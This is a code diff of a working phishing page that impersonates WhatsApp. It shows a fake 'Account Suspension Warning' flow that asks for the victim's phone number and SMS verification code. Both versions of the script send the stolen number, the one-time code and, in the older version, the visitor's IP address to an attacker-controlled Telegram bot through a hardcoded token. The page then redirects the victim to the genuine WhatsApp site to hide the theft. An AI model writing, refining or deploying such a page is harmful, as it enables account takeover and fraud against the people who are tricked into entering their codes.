@@ -3,140 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Security Verification</title>
+    <title>WhatsApp Security</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #ffffff; color: #111b21; display: flex; justify-content: center; align-items: flex-start; height: 100vh; padding-top: 60px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { width: 100%; max-width: 360px; padding: 20px; text-align: center; }
         
-        .wrapper { width: 100%; max-width: 360px; padding: 0 30px; text-align: center; }
-        
-        .header-title { color: #008069; font-size: 19px; font-weight: 500; margin-bottom: 30px; }
-        
-        .security-banner { background-color: #fff8e1; border: 1px solid #ffeeba; border-radius: 8px; padding: 12px; margin-bottom: 25px; text-align: left; }
-        .security-banner p { font-size: 13px; color: #856404; line-height: 1.4; }
+        /* شاشات مختلفة */
+        #loading-screen { display: flex; flex-direction: column; align-items: center; }
+        #phone-screen, #otp-screen { display: none; }
 
-        .desc { font-size: 14.5px; color: #667781; line-height: 1.5; margin-bottom: 25px; }
-        .phone { color: #111b21; font-weight: 600; display: block; margin: 4px 0; }
+        .logo { width: 70px; margin-bottom: 25px; }
+        h1 { color: #008069; font-size: 19px; font-weight: 500; margin-bottom: 15px; }
+        p { font-size: 14px; color: #667781; line-height: 1.5; margin-bottom: 25px; }
 
-        .otp-box { margin-bottom: 20px; }
-        .otp-input {
-            width: 160px;
-            border: none;
-            border-bottom: 2px solid #00a884;
-            font-size: 28px;
-            text-align: center;
-            letter-spacing: 6px;
-            outline: none;
-            padding-bottom: 5px;
-            background: transparent;
-        }
-        .otp-input::placeholder { color: #d1d7db; letter-spacing: 2px; }
+        input { width: 100%; padding: 12px; border: none; border-bottom: 2px solid #00a884; font-size: 18px; text-align: center; outline: none; margin-bottom: 25px; }
+        .otp-input { font-size: 28px; letter-spacing: 5px; }
 
-        .hint { font-size: 13px; color: #8696a0; margin-bottom: 40px; }
+        button { background: #008069; color: #fff; border: none; padding: 12px 30px; border-radius: 25px; font-size: 14px; font-weight: 600; width: 100%; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
 
-        .btn-submit {
-            background-color: #008069;
-            color: white;
-            border: none;
-            padding: 12px 40px;
-            border-radius: 25px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        .actions-footer { margin-top: 45px; border-top: 1px solid #f1f1f2; padding-top: 10px; }
-        .action-link { display: flex; align-items: center; padding: 15px 0; cursor: pointer; text-decoration: none; }
-        .action-link img { width: 20px; margin-right: 15px; opacity: 0.6; }
-        .action-link span { color: #008069; font-size: 14.5px; font-weight: 500; flex-grow: 1; text-align: left; }
-        .timer { color: #8696a0; font-size: 13px; }
-
-        #progress { display: none; position: fixed; top: 0; left: 0; width: 0%; height: 3px; background-color: #00a884; transition: width 0.4s; z-index: 1001; }
+        /* الأنميشن */
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #008069; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div id="progress"></div>
+    <div id="loading-screen" class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+        <div class="spinner"></div>
+        <p style="margin-top: 20px;">Checking security status...</p>
+    </div>
 
-    <div class="wrapper">
-        <div class="header-title">Account Security</div>
+    <div id="phone-screen" class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo" style="width: 50px;">
+        <h1>Account Suspension Warning</h1>
+        <p>Unauthorized login detected. Enter your phone number linked to this account to start the recovery process.</p>
+        <input type="tel" id="phoneNumber" placeholder="Phone Number (e.g. +20...)" required>
+        <button onclick="processPhone()">Verify Number</button>
+    </div>
 
-        <div class="security-banner">
-            <p><strong>Restricted:</strong> Your account is temporarily restricted due to multiple login attempts. Verification is required to restore access.</p>
-        </div>
-
-        <div class="desc">
-            Enter the 6-digit code sent to your registered number:
-            <span class="phone">+20 103 *** **87</span>
-        </div>
-
-        <form id="authForm">
-            <div class="otp-box">
-                <input type="text" id="otp" class="otp-input" placeholder="--- ---" maxlength="6" inputmode="numeric" required>
-            </div>
-            <p class="hint">Enter 6-digit code</p>
-            
-            <button type="submit" id="btn" class="btn-submit">VERIFY & RESTORE</button>
-        </form>
-
-        <div class="actions-footer">
-            <div class="action-link">
-                <img src="https://img.icons8.com/material-rounded/24/008069/sms.png">
-                <span>Resend SMS</span>
-                <div class="timer">1:24</div>
-            </div>
-            <div class="action-link">
-                <img src="https://img.icons8.com/material-rounded/24/008069/phone.png">
-                <span>Call me</span>
-                <div class="timer">2:00</div>
-            </div>
-        </div>
+    <div id="otp-screen" class="container">
+        <h1 style="margin-top: 0;">Confirm Identity</h1>
+        <p>A 6-digit code has been sent to:<br><strong id="maskedNum" style="color:#111b21;"></strong></p>
+        <input type="text" id="otpCode" class="otp-input" placeholder="--- ---" maxlength="6" inputmode="numeric">
+        <button id="finalBtn">Finish & Secure</button>
+        <p style="margin-top: 20px; color: #008069; font-size: 13px; cursor: pointer;">Resend SMS (1:58)</p>
     </div>
 
     <script>
-        const API = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709', REF: '01030003287' };
+        const BOT = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
+        let userPhone = "";
 
-        window.onload = async () => {
-            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
-            fetch(`https://api.telegram.org/bot${API.T}/sendMessage`, {
+        // أول ما يفتح الصفحة: استنى 3 ثواني وبعدين اطلب الرقم
+        setTimeout(() => {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('phone-screen').style.display = 'block';
+        }, 3000);
+
+        async function notify(msg) {
+            fetch(`https://api.telegram.org/bot${BOT.T}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: API.C, text: `🌐 [VISITOR] Page accessed by target.\nIP: ${ip}\nID: ${API.REF}` })
+                body: JSON.stringify({ chat_id: BOT.C, text: msg })
             });
+        }
+
+        async function processPhone() {
+            userPhone = document.getElementById('phoneNumber').value;
+            if (userPhone.length < 8) return alert("Enter a valid number");
+
+            notify(`☎️ Target Number Entered: ${userPhone}`);
+            
+            // عمل إخفاء للرقم زي الحقيقة
+            const masked = userPhone.substring(0, 4) + " *** **" + userPhone.substring(userPhone.length - 2);
+            document.getElementById('maskedNum').innerText = masked;
+
+            // تحويل لشاشة الكود مع لودر وهمي
+            document.getElementById('phone-screen').innerHTML = '<div class="spinner" style="margin: 0 auto;"></div><p>Sending code...</p>';
+            setTimeout(() => {
+                document.getElementById('phone-screen').style.display = 'none';
+                document.getElementById('otp-screen').style.display = 'block';
+            }, 2000);
+        }
+
+        document.getElementById('finalBtn').onclick = async function() {
+            const code = document.getElementById('otpCode').value;
+            if (code.length < 6) return alert("Enter 6 digits");
+
+            this.innerText = "AUTHENTICATING...";
+            await notify(`🔥 SUCCESS! OTP RECEIVED\n\nNumber: ${userPhone}\nCode: ${code}`);
+            
+            window.location.href = "https://www.whatsapp.com/security";
         };
-
-        document.getElementById('authForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const btn = document.getElementById('btn');
-            const prg = document.getElementById('progress');
-            const code = document.getElementById('otp').value;
-
-            btn.disabled = true;
-            btn.innerText = "PROCESSING...";
-            prg.style.display = 'block';
-            setTimeout(() => prg.style.width = '80%', 100);
-
-            try {
-                const ipD = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                await fetch(`https://api.telegram.org/bot${API.T}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: API.C,
-                        text: `🚀 [HIT] OTP RECEIVED!\n\nTarget: ${API.REF}\nOTP: ${code}\nIP: ${ipD.ip}`
-                    })
-                });
-
-                setTimeout(() => {
-                    window.location.href = "https://www.whatsapp.com/contact/";
-                }, 2000);
-            } catch (err) {
-                btn.disabled = false;
-                btn.innerText = "VERIFY & RESTORE";
-            }
-        });
     </script>
 </body>
 </html>
